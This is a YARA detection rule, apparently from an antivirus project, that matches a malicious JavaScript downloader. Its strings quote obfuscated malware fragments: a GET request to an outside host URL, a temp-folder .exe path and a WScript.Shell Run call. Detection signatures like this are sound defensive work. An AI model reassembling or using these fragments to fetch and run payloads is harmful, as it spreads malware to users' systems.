rule sig_20160328_89ea4824d348efc39bed3fa55533074f {
  meta:
    description = "datamaliciousorder - file 20160328_89ea4824d348efc39bed3fa55533074f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "89ee91960f42b17c08e04f821c3002066ccb15b8b9ee641c88541472476cbe9d"

  strings:
    $s1  = "function Bkscwr() {return Jxvgyv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"OZr6zhgUkML1m5s.exe\";};" fullword ascii
    $s2  = "Rkbixyro[Atsvsvxlj](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Wrwmkm](Iqodszwsxb() * 11)} while (Rkbixyro[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Dnmvthtvj(Oubduioq, Yaanrvmx){return Oubduioq - Yaanrvmx;};" fullword ascii
    $s5  = "var Jxvgyv = function Bmiefueft() {return WScript[Kxdga](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Elmainb() {return ((Xfxkja == true) && (Xfxkja == Srnkd)) ? 1 : Ojzqpbgxf;};" fullword ascii
    $s7  = "return Dnmvthtvj(Qjdstuer, Yllhcomsi);" fullword ascii
    $s8  = "function Fkaurbyq(Pdievea){Jxvgyv[\"Run\"](Pdievea, Ojzqpbgxf, Ojzqpbgxf);};" fullword ascii
    $s9  = "function Nzvkmnf(){return Cofqqiogoj;};" fullword ascii
    $s10 = "Xfxkja = true; " fullword ascii
    $s11 = "function Iqodszwsxb(){return 22;};" fullword ascii
    $s12 = "var Xfxkja = false;" fullword ascii
    $s13 = "function Zameclssc(){return Kxdga;};" fullword ascii
    $s14 = "Srnkd = true; " fullword ascii
    $s15 = "var Srnkd = false;" fullword ascii
    $s16 = "var Pyjaciawbq = false;" fullword ascii
    $s17 = "function Awwunftq(Rqjlhpc) {var Cchdzcpjry = (1, 2, 3, 4, 5, Rqjlhpc); return Cchdzcpjry;};" fullword ascii
    $s18 = "function Mmxcmgmfa()" fullword ascii
    $s19 = "var Wrgfft = new this[\"Date\"]();" fullword ascii
    $s20 = "} catch(Ozjpwqti){Looshcaupx = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}